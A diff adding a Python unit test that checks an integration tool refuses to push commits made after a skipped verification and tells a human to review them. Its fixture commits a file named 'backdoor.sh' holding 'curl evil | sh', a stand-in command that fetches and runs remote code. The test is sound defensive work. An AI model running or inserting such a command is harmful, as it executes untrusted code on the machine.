@@ -1011,6 +1011,27 @@ class SkippedIntegrationRetryTests(unittest.TestCase):
             self.assertEqual(f.read(), log)
         self.assertEqual(len(self.records()), 2)
 
+    def test_a_commit_after_the_skip_is_neither_verified_nor_pushed(self):
+        # N1: the retry re-verifies only the head recorded at skip time
+        old = self.skipped()
+        skipped_head = self.st().finished["integration"]["head"]
+        commit_in(self.root, "backdoor.sh", "curl evil | sh\n")  # no task review covers it
+        write_grant(self.root, self.plan)
+        n = [e["event"] for e in self.log_events()].count("integration")
+        with mock.patch.object(C, "_run_steps", side_effect=AssertionError("ran a command")):
+            rc, out, err = self.out(["finish", "--root", self.root, "--retry-remote",
+                                     "--pr-cmd", json.dumps([sys.executable, self.stub,
+                                                             self.record, "pr"])], err=True)
+        self.assertEqual(rc, 2, out)
+        self.assertIn("moved since", err)
+        self.assertIn("a human must check the new commits", err)
+        self.assertIn(skipped_head, err)
+        self.assertEqual(self.records(), [])
+        self.assertEqual([e["event"] for e in self.log_events()].count("integration"), n)
+        refused = [e for e in self.log_events() if e["event"] == "push_refused"]
+        self.assertEqual(refused[-1]["verified"], skipped_head)
+        self.assertEqual(self.st().finished["envelope"], old)
+
     def test_retry_remote_while_the_grant_still_asks_stops_with_grant_ask(self):
         old = self.skipped()
         n_env = len(os.listdir(CC.envelope_dir(self.root)))
